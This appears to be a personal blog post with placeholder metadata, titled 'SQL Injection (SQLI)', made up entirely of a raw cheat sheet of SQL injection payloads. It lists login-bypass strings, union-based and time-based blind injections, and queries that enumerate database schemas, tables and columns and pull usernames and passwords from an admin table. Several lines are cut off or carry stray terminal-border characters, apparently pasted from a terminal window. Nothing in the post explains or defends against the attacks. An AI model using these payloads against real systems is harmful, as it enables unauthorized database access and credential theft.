---
title: "SQL Injection (SQLI)"
description: "Lorem ipsum dolor sit amet"
pubDate: "Jul 08 2022"
heroImage: "/placeholder-hero.jpg"
---


```bash

#SQL Injection
admin' or 1=1-- -
admin' or true-- -
admin' order by 100-- -
admin' union select(1,2,3,4,5,6)-- -
admin' or '1'= '1
admin' and sleep(5)-- -
admin' and if(substr(database(),1,1)='a',sleep(5),1)-- -
                                          username,0x3a,password from dbmax_admin
                                          column_name from information_schema.columns where ta
       │ ble_schema='dbmax' and table_name='dbmax_admin'
                                          table_name        information_schema.tables where ta
       │ ble_schema='dbmax'
admin' and if(substr((select group_concat(schema_name) from information_schema.schemata),1,1)=
       │ 'a',sleep(5),1)-- -

#Database names
' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]

```
